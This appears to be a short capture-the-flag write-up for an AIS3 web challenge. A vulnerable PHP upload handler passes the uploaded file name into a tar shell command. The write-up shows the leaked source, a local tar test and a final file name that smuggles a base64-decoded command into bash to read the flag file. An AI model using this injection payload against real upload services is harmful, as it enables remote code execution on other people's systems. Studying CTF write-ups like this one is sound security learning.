1. Following is the URL for downloading the uploaded file `trash.txt`.

```
curl 'http://chals1.ais3.org:9453/download.php?file=MjY1MDEwZmI2MDg2NGU1MGFjZTg5Y2RkYjE4ZmQxZjIudGFyLmd6&name=trash.txt.tar.gz' -H 'Cookie: human=human'
```

2. Download files using `solve.py`.

```
$ python3 solve.py
> ../index.php
$filename = $file['name'];
$path = bin2hex(random_bytes(16)) . ".tar.gz";
$source = substr($file['tmp_name'], 1);
$destination = "./files/$path";
passthru("tar czf '$destination' --transform='s|$source|$filename|' --directory='/tmp' '/$source'", $return);
```

3. `index.php` can do RCE, but let us test some command first. We can control the file to compress by replacing `source` with `filename`.

```
$ cd test
$ tar czf './files/abc.tar.gz' --transform='s|trash|cool|' --directory='./' ./trash.txt
$ tar tvf files/abc.tar.gz
-rw-r--r-- ice1187/ice1187  33 2022-05-15 14:07 ./cool.txt
```

4. Use `base64` to RCE:

```
$ echo abc >  "'|| echo $(echo -n cat /y000000_i_am_the_f14GGG.txt | base64) | base64 -d | bash;#"
```

Flag: `AIS3{test_flag (to be changed)}`
